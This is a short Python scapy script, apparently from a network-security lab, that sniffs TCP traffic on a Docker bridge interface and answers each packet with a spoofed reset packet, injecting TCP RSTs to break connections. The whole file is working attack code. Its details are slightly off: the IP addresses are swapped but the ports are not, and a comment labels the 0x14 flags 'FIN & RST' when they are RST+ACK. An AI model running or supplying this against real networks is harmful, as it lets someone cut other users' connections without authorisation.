from scapy.all import *


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='tcp',prn=my_rstAttack)

def my_rstAttack(pkt):
    #pkt.show()
    #IP
    ip=IP()
    ip.src=pkt[IP].dst
    ip.dst=pkt[IP].src
    #TCP
    tcp=TCP()
    tcp.sport=pkt[TCP].sport
    tcp.dport=pkt[TCP].dport
    tcp.seq=pkt[TCP].ack
    tcp.ack=pkt[TCP].seq+1
    tcp.flags=0x14#"FR" #FIN & RST flag
    print("[] INFO MY CRAFTED RST PACKET...")
    print("tcp.sport:",tcp.sport)
    print("tcp.dport:",tcp.dport)
    print("tcp.seq:",tcp.seq)
    print("tcp.ack:",tcp.ack)
    print("-"*80)
    
    reset_pkt=ip/tcp
    print("[+] Sending rst packet ...")
    send(reset_pkt)

 
if __name__=="__main__":
    my_sniff()
    
